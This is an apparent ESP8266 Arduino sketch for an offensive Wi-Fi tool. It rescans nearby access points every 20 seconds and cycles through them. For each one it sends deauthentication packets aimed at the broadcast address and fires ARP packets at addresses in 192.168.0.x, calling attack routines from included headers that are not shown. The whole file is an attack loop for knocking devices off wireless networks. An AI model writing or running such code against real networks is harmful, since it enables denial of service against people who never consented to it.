#include <ESP8266WiFi.h>
#include "atk.h"
#include "scan.h"
#include "types.h"
#include "arpatk.h"

AccessPoint* aps;
int8_t found;
unsigned long it = 1;
unsigned long worktime = 20000;  //time to rescan in ms
unsigned long uptime;

//=======================================================================
//                     SETUP
//=======================================================================
void setup() {
  //WiFi.mode(WIFI_STA);
  Serial.begin(115200);
  initScan(&found);
  aps = scan();
  uptime = millis();
  Serial.print("End of init\n");
}

uint8_t target[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
uint8_t tip[4] = { 192, 168, 0, 2 };

//=======================================================================
//                        LOOP
//=======================================================================
void loop() {

  if (worktime <= millis() - uptime) {
    Serial.printf("%ul", uptime);
    Serial.print("Rescanning...\n");
    initScan(&found);
    free(aps);
    aps = scan();
    uptime = millis();
    it = 0;
  }

  sendDeauthPacket(&aps[it], target);

  sendArp(tip);
  // Serial.printf("IP: %hhx.%hhx.%hhx.%hhx\nIt: %d\n", tip[0], tip[1], tip[2], tip[3], it);
  it++;
  if (it >= found) {
    it = 0;
  }
  tip[3] = it;
  wdt_reset();
  delay(0);
}
//=====================================================================
